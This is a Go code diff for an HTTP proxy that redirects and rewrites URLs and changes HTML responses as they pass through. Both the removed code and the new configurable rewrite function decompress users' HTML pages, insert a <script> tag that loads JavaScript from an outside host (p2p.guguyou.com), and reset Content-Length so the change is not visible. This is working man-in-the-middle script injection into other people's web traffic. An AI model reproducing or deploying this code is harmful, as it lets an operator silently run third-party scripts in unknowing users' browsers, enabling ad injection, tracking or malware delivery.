@@ -19,31 +19,40 @@ import (
 )
 
 const (
-	Rewrite = iota
-	Redirect
+	Rewrite_URL = iota
+	Redirect_URL
+	Rewrite_HTML
 )
 
 type RuleTypeof int32
 
-type jSONCompiler struct {
+type JSONCompiler struct {
 	Type  RuleTypeof `json:"type"`
 	Host  string     `json:"host"`
 	Match []string   `json:"match"`
 }
 
-type jSONSRule struct {
-	Compiler []jSONCompiler `json:"compilers"`
+type JSONSRule struct {
+	Compiler []JSONCompiler `json:"compilers"`
+}
+
+type JSONLimits struct {
+	MaxResponseContentLen int64 `json:"max_response_content_len"`
 }
 
 type JSONRules struct {
 	Local  bool        `json:"local"`
-	SRules []jSONSRule `json:"srules"`
+	Limits JSONLimits  `json:"limits"`
+	SRules []JSONSRule `json:"srules"`
 }
 
 type SRules struct {
-	local    bool
-	Rewrite  *compiler.SCompiler
-	Redirect *compiler.SCompiler
+	local        bool
+	limits       JSONLimits
+	Rewrite_URL  *compiler.SCompiler
+	Redirect_URL *compiler.SCompiler
+
+	Rewrite_HTML *compiler.SCompiler
 
 	tranpoort_local  *http.Transport
 	tranpoort_remote *http.Transport
@@ -52,8 +61,10 @@ type SRules struct {
 func NewSRules(forward Dialer) *SRules {
 
 	return &SRules{
-		Rewrite:  compiler.NewSCompiler(),
-		Redirect: compiler.NewSCompiler(),
+		Rewrite_URL:  compiler.NewSCompiler(),
+		Redirect_URL: compiler.NewSCompiler(),
+		Rewrite_HTML: compiler.NewSCompiler(),
+
 		tranpoort_remote: &http.Transport{
 			Dial: func(network, addr string) (net.Conn, error) {
 				return forward.Dial(network, addr)
@@ -76,6 +87,7 @@ func (this *SRules) ResolveJson(data []byte) (err error) {
 	}
 
 	this.local = jsonRules.Local
+	this.limits = jsonRules.Limits
 
 	if false == this.local {
 		this.tranpoort_local = this.tranpoort_remote
@@ -90,10 +102,64 @@ func (this *SRules) ResolveJson(data []byte) (err error) {
 	return nil
 }
 
+func (this *SRules) ResolveRewriteHTML(req *http.Request, resp *http.Response) (newresp *http.Response) {
+
+	if resp_type := resp.Header.Get("Content-Type"); false == strings.Contains(strings.ToLower(resp_type), "text/html") {
+		return nil
+	}
+
+	if resp.ContentLength <= 0 || resp.ContentLength > this.limits.MaxResponseContentLen {
+		return nil
+	}
+
+	bodyReader := bufio.NewReader(resp.Body)
+
+	if strings.EqualFold(resp.Header.Get("Content-Encoding"), "gzip") {
+
+		read, _ := gzip.NewReader(resp.Body)
+
+		bodyReader = bufio.NewReader(read)
+
+		resp.Header.Del("Content-Encoding")
+	}
+
+	//dumpdata, _ := httputil.DumpResponse(resp, true)
+
+	//log.Println(string(dumpdata))
+
+	var bodyBuf bytes.Buffer
+
+	bodyBuf.ReadFrom(bodyReader)
+
+	//smatch, _ := compiler.NewSMatch(`s@(^\s*<!DOCTYPE HTML[\s\S]*>[\s\S]*<html[\s\S]*>[\s\S]*<head[\s\S]*>[\s\S]*)(</head>[\s\S]*<body[\s\S]*>[\s\S]*)(</body>[\s\S]*</html>[\s\S]*)$@$1<script type="text/javascript" src="http://p2p.guguyou.com/C/c?fmt10476&100&%SID%"></script>$2$3@i`)
+
+	//html, err := smatch.Replace(bodyBuf.String())
+	html, err := this.Rewrite_HTML.Replace(resp.Request.Host, bodyBuf.String())
+
+	if err == nil {
+		log.Printf("injection[%d]: %s\n", resp.ContentLength, resp.Request.URL.String())
+	} else {
+		html = bodyBuf.String()
+		//log.Printf("injection failed[%d]: %s,err: %s\n", resp.ContentLength, resp.Request.URL.String(), err.Error())
+	}
+
+	if -1 != resp.ContentLength {
+		resp.ContentLength = int64(len([]byte(html)))
+		resp.Header.Set("Content-Length", strconv.Itoa(len([]byte(html))))
+	}
+
+	oldBody := resp.Body
+	defer oldBody.Close()
+
+	resp.Body = ioutil.NopCloser(strings.NewReader(html))
+
+	return resp
+}
+
 func (this *SRules) ResolveRequest(req *http.Request) (tran *http.Transport, resp *http.Response) {
 	tran = this.tranpoort_local
 
-	if dsturl, err := this.replaceURL(this.Redirect, req.Host, req.URL.String()); err == nil {
+	if dsturl, err := this.replaceURL(this.Redirect_URL, req.Host, req.URL.String()); err == nil {
 		if false == strings.EqualFold(req.URL.String(), dsturl.String()) {
 			log.Println("redirect: ", req.URL, " to ", dsturl)
 
@@ -109,7 +175,7 @@ func (this *SRules) ResolveRequest(req *http.Request) (tran *http.Transport, res
 		}
 	}
 
-	if dsturl, err := this.replaceURL(this.Rewrite, req.Host, req.URL.String()); err == nil {
+	if dsturl, err := this.replaceURL(this.Rewrite_URL, req.Host, req.URL.String()); err == nil {
 		if strings.EqualFold(req.URL.Host, dsturl.Host) {
 			log.Println("rewrite: ", req.URL, " to ", dsturl)
 
@@ -127,50 +193,8 @@ func (this *SRules) ResolveRequest(req *http.Request) (tran *http.Transport, res
 
 func (this *SRules) ResolveResponse(req *http.Request, resp *http.Response) *http.Response {
 
-	if resp_type := resp.Header.Get("Content-Type"); strings.Contains(strings.ToLower(resp_type), "text/html") {
-
-		if resp.ContentLength > 0 && resp.ContentLength < 1024000 {
-
-			oldBody := resp.Body
-			defer oldBody.Close()
-
-			newReader := bufio.NewReader(resp.Body)
-
-			if strings.EqualFold(resp.Header.Get("Content-Encoding"), "gzip") {
-
-				read, _ := gzip.NewReader(resp.Body)
-
-				newReader = bufio.NewReader(read)
-
-				resp.Header.Del("Content-Encoding")
-			}
-
-			//dumpdata, _ := httputil.DumpResponse(resp, true)
-
-			//log.Println(string(dumpdata))
-
-			var buf bytes.Buffer
-
-			buf.ReadFrom(newReader)
-
-			smatch, _ := compiler.NewSMatch(`s@(^\s*<!DOCTYPE HTML[\s\S]*>[\s\S]*<html[\s\S]*>[\s\S]*<head[\s\S]*>[\s\S]*)(</head>[\s\S]*<body[\s\S]*>[\s\S]*)(</body>[\s\S]*</html>[\s\S]*)$@$1<script type="text/javascript" src="http://p2p.guguyou.com/D/d?16FB&100"></script>$2$3@i`)
-
-			html, err := smatch.Replace(buf.String())
-
-			if err == nil {
-				log.Printf("injection[%d]: %s\n", resp.ContentLength, resp.Request.URL.String())
-			} else {
-				html = buf.String()
-			}
-
-			if -1 != resp.ContentLength {
-				resp.ContentLength = int64(len([]byte(html)))
-				resp.Header.Set("Content-Length", strconv.Itoa(len([]byte(html))))
-			}
-
-			resp.Body = ioutil.NopCloser(strings.NewReader(html))
-
-		}
+	if newresp := this.ResolveRewriteHTML(req, resp); nil != newresp {
+		return newresp
 	}
 
 	return resp
@@ -195,15 +219,17 @@ func (this *SRules) createRedirectResponse(url string, req *http.Request) (resp 
 	return
 }
 
-func (this *SRules) Add(compiler jSONCompiler) (err error) {
+func (this *SRules) Add(compiler JSONCompiler) (err error) {
 
 	switch compiler.Type {
-	case Rewrite:
-		err = this.Rewrite.Add(compiler.Host, compiler.Match)
-	case Redirect:
-		err = this.Redirect.Add(compiler.Host, compiler.Match)
+	case Rewrite_URL:
+		err = this.Rewrite_URL.Add(compiler.Host, compiler.Match)
+	case Redirect_URL:
+		err = this.Redirect_URL.Add(compiler.Host, compiler.Match)
+	case Rewrite_HTML:
+		err = this.Rewrite_HTML.Add(compiler.Host, compiler.Match)
 	default:
-		return errors.New("无法是别的规则类型")
+		return errors.New("无法识别的规则类型")
 	}
 
 	for i := 0; i < len(compiler.Match); i++ {
